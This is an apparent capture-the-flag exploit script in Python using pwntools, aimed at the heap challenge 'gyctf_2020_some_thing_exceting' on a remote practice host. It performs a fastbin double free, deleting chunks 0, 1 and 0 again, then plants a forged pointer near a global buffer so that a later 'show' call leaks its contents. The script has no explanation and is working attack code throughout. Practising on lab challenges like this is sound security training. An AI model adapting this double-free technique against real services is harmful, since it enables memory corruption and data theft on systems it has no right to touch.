from pwn import *
libc = ELF("./libc-2.23.so")
#p = process("./gyctf_2020_some_thing_exceting")
p = remote("node3.buuoj.cn",28884)
def dbg():
    gdb.attach(p)
    pause()
def choice(num):
	p.sendlineafter("what you want to do :",str(num))
	
def add(size1,text1,size2,text2):
	choice(1)
	p.sendlineafter("ba's length :",str(size1))
	p.sendafter("ba",text1)
	p.sendlineafter("na's length :",str(size2))
	p.sendafter("na",text2)

def delete(id):
	choice(3)
	p.sendlineafter(" ID :",str(id))
	
def show(id):
	choice(4)
	p.sendlineafter(" ID :",str(id))

wite_give=0x6020A0-0x8	
	
add(0x50,"aaaa",0x50,"bbbb")
add(0x50,"cccc",0x50,"dddd")	
delete(0)
delete(1)
delete(0)
add(0x50,p64(wite_give),0x50,p64(wite_give))
add(0x50,"a",0x50,"a")
add(0x50,"f",0x30,"\n")

show(4)
#dbg()



p.interactive()